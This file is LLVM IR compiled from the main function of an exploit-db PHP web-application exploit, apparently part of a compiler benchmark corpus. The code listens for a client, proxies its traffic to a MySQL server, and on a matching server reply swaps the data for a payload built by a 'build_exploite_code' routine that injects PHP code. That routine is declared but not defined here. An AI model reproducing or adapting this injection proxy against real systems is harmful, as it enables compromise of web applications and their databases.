; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/php/webapps/extr_309.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/php/webapps/extr_309.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32 }
%struct.timeval = type { i32, i64 }
%struct.sockaddr = type { i32 }

@DATABASE = common dso_local global i8* null, align 8
@BUFFER_LEN = common dso_local global i32 0, align 4
@phpcodes = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [24 x i8] c"waiting for connection\0A\00", align 1
@.str.1 = private unnamed_addr constant [9 x i8] c"accept()\00", align 1
@.str.2 = private unnamed_addr constant [23 x i8] c"got client connection\0A\00", align 1
@.str.3 = private unnamed_addr constant [9 x i8] c"select()\00", align 1
@SHUT_RDWR = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  %11 = alloca i64, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.timeval, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %22 = load i8*, i8** @DATABASE, align 8
  store i8* %22, i8** %21, align 8
  %23 = load i32, i32* @BUFFER_LEN, align 4
  %24 = sext i32 %23 to i64
  %25 = mul i64 1, %24
  %26 = trunc i64 %25 to i32
  %27 = call i64 @malloc(i32 %26)
  %28 = inttoptr i64 %27 to i8*
  store i8* %28, i8** %12, align 8
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 0
  store i32 15, i32* %29, align 8
  %30 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 1
  store i64 0, i64* %30, align 8
  %31 = call i32 (...) @listener()
  store i32 %31, i32* %8, align 4
  %32 = load i8*, i8** %21, align 8
  %33 = load i32, i32* @phpcodes, align 4
  %34 = call i32 @build_exploite_code(i8* %32, i32 %33, i8** %20)
  store i32 %34, i32* %18, align 4
  br label %35

35:                                               ; preds = %147, %2
  %36 = load i32, i32* @stderr, align 4
  %37 = call i32 (i32, i8*, ...) @fprintf(i32 %36, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str, i64 0, i64 0))
  %38 = load i32, i32* %8, align 4
  %39 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %40 = call i32 @accept(i32 %38, %struct.sockaddr* %39, i32* %7)
  store i32 %40, i32* %13, align 4
  %41 = icmp eq i32 -1, %40
  br i1 %41, label %42, label %44

42:                                               ; preds = %35
  %43 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0))
  br label %44

44:                                               ; preds = %42, %35
  %45 = load i32, i32* @stderr, align 4
  %46 = call i32 (i32, i8*, ...) @fprintf(i32 %45, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.2, i64 0, i64 0))
  br label %47

47:                                               ; preds = %82, %44
  %48 = call i32 (...) @connect_mysql()
  store i32 %48, i32* %9, align 4
  br label %49

49:                                               ; preds = %146, %47
  %50 = call i32 @FD_ZERO(i32* %16)
  %51 = load i32, i32* %13, align 4
  %52 = call i32 @FD_SET(i32 %51, i32* %16)
  %53 = load i32, i32* %9, align 4
  %54 = call i32 @FD_SET(i32 %53, i32* %16)
  %55 = load i32, i32* %13, align 4
  %56 = load i32, i32* %9, align 4
  %57 = icmp sgt i32 %55, %56
  br i1 %57, label %58, label %60

58:                                               ; preds = %49
  %59 = load i32, i32* %13, align 4
  br label %62

60:                                               ; preds = %49
  %61 = load i32, i32* %9, align 4
  br label %62

62:                                               ; preds = %60, %58
  %63 = phi i32 [ %59, %58 ], [ %61, %60 ]
  store i32 %63, i32* %15, align 4
  %64 = load i32, i32* %15, align 4
  %65 = add nsw i32 %64, 1
  %66 = call i32 @select(i32 %65, i32* %16, i32* null, i32* null, i32* null)
  store i32 %66, i32* %14, align 4
  %67 = load i32, i32* %14, align 4
  %68 = icmp eq i32 -1, %67
  br i1 %68, label %69, label %71

69:                                               ; preds = %62
  %70 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0))
  br label %146

71:                                               ; preds = %62
  %72 = load i32, i32* %9, align 4
  %73 = call i64 @FD_ISSET(i32 %72, i32* %16)
  %74 = icmp ne i64 %73, 0
  br i1 %74, label %75, label %123

75:                                               ; preds = %71
  %76 = load i32, i32* %9, align 4
  %77 = load i8*, i8** %12, align 8
  %78 = load i32, i32* @BUFFER_LEN, align 4
  %79 = call i64 @read(i32 %76, i8* %77, i32 %78)
  store i64 %79, i64* %10, align 8
  %80 = load i64, i64* %10, align 8
  %81 = icmp eq i64 %80, 0
  br i1 %81, label %82, label %88

82:                                               ; preds = %75
  %83 = load i32, i32* %9, align 4
  %84 = load i32, i32* @SHUT_RDWR, align 4
  %85 = call i32 @shutdown(i32 %83, i32 %84)
  %86 = load i32, i32* %9, align 4
  %87 = call i32 @close(i32 %86)
  br label %47

88:                                               ; preds = %75
  %89 = load i8*, i8** %12, align 8
  %90 = getelementptr inbounds i8, i8* %89, i64 11
  %91 = load i8, i8* %90, align 1
  %92 = sext i8 %91 to i32
  %93 = icmp eq i32 84, %92
  br i1 %93, label %94, label %115

94:                                               ; preds = %88
  store i32 0, i32* %19, align 4
  br label %95

95:                                               ; preds = %109, %94
  %96 = load i32, i32* %19, align 4
  %97 = load i32, i32* %18, align 4
  %98 = icmp slt i32 %96, %97
  br i1 %98, label %99, label %112

99:                                               ; preds = %95
  %100 = load i8*, i8** %20, align 8
  %101 = load i32, i32* %19, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i8, i8* %100, i64 %102
  %104 = load i8, i8* %103, align 1
  %105 = load i8*, i8** %12, align 8
  %106 = load i32, i32* %19, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i8, i8* %105, i64 %107
  store i8 %104, i8* %108, align 1
  br label %109

109:                                              ; preds = %99
  %110 = load i32, i32* %19, align 4
  %111 = add nsw i32 %110, 1
  store i32 %111, i32* %19, align 4
  br label %95

112:                                              ; preds = %95
  %113 = load i32, i32* %18, align 4
  %114 = sext i32 %113 to i64
  store i64 %114, i64* %10, align 8
  br label %115

115:                                              ; preds = %112, %88
  %116 = load i32, i32* %13, align 4
  %117 = load i8*, i8** %12, align 8
  %118 = load i64, i64* %10, align 8
  %119 = call i64 @write(i32 %116, i8* %117, i64 %118)
  %120 = icmp slt i64 %119, 0
  br i1 %120, label %121, label %122

121:                                              ; preds = %115
  br label %147

122:                                              ; preds = %115
  br label %123

123:                                              ; preds = %122, %71
  %124 = load i32, i32* %13, align 4
  %125 = call i64 @FD_ISSET(i32 %124, i32* %16)
  %126 = icmp ne i64 %125, 0
  br i1 %126, label %127, label %145

127:                                              ; preds = %123
  %128 = load i32, i32* %13, align 4
  %129 = load i8*, i8** %12, align 8
  %130 = load i32, i32* @BUFFER_LEN, align 4
  %131 = call i64 @read(i32 %128, i8* %129, i32 %130)
  store i64 %131, i64* %10, align 8
  %132 = load i64, i64* %10, align 8
  %133 = icmp eq i64 %132, 0
  br i1 %133, label %134, label %137

134:                                              ; preds = %127
  %135 = load i32, i32* %13, align 4
  %136 = call i32 @close(i32 %135)
  br label %147

137:                                              ; preds = %127
  %138 = load i32, i32* %9, align 4
  %139 = load i8*, i8** %12, align 8
  %140 = load i64, i64* %10, align 8
  %141 = call i64 @write(i32 %138, i8* %139, i64 %140)
  %142 = icmp slt i64 %141, 0
  br i1 %142, label %143, label %144

143:                                              ; preds = %137
  br label %147

144:                                              ; preds = %137
  br label %145

145:                                              ; preds = %144, %123
  br label %146

146:                                              ; preds = %145, %69
  br label %49

147:                                              ; preds = %143, %134, %121
  br label %35
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @listener(...) #1

declare dso_local i32 @build_exploite_code(i8*, i32, i8**) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @accept(i32, %struct.sockaddr*, i32*) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @connect_mysql(...) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i64 @read(i32, i8*, i32) #1

declare dso_local i32 @shutdown(i32, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i64 @write(i32, i8*, i64) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
